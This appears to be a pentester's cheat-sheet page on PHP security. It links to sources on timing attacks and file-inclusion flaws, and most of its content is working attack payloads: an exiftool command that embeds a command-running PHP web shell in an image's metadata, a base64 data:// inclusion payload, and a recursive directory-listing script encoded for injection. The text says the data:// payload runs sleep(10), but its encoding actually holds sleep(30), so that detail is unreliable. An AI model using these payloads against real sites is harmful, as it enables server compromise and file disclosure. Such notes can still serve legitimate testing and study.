### Security - PHP

## Timing Attacks
- https://paragonie.com/blog/2015/11/preventing-timing-attacks-on-string-comparison-with-double-hmac-strategy
- http://blog.ircmaxell.com/2014/11/its-all-about-time.html
- https://github.com/pentestmonkey/timing-attack-checker

## Inclusion
- http://php.net/manual/en/function.include.php
- Don't forget about the null byte! `%00`
- https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
- https://upshell.wordpress.com/2011/06/11/new-vulnerabilities-to-access-files-in-php/
- https://websec.io/2012/09/05/A-Silent-Threat-PHP-in-EXIF.html

### Inclusion with Images
Sometimes you may have an `include` but you can add arbitrary PHP files. There may however be a place to add images and you can embed php in an image which gets executed if the image is included.

```
exiftool -documentname='<?php echo system(isset($_GET["c"]) ? $_GET["c"] : "ls -lah"); ?>' profile.jpg
```




Sometimes PHP is so terribly configured you can inject your code into the inclusion. 
Here is an example of how you can pass a `sleep(10);` into a possible `include` which 
would cause the page load to be delayed by ~10s if the page did indeed and a vulernable 
input & include combo.

`index.php?file=data://text/plain;base64,PD9waHAgc2xlZXAoMzApOw==%00`

#### Recon
If you can inject your code into PHP includes, below is an example of a file system walker to list all files in the current directory.

```php
<?php function sc4nn3r($r){
echo $r.PHP_EOL;
if(is_file($r)||!is_dir($r))return;
$ds=scandir($r);
foreach($ds as$d){
  if ($d=='.'||$d == '..')continue;
  $p=$r.'/'.$d;
  sc4nn3r($p); 
 }
}; sc4nn3r('./');
```
... base64 Encodes to

`PD9waHAgZnVuY3Rpb24gc2M0bm4zcigkcil7CmVjaG8gJHIuUEhQX0VPTDsKaWYoaXNfZmlsZSgkcil8fCFpc19kaXIoJHIpKXJldHVybjsKJGRzPXNjYW5kaXIoJHIpOwpmb3JlYWNoKCRkcyBhcyRkKXsKICBpZiAoJGQ9PScuJ3x8JGQgPT0gJy4uJyljb250aW51ZTsKICAkcD0kci4nLycuJGQ7CiAgc2M0bm4zcigkcCk7IAogfQp9c2M0bm4zcignLi8nKTs=
`


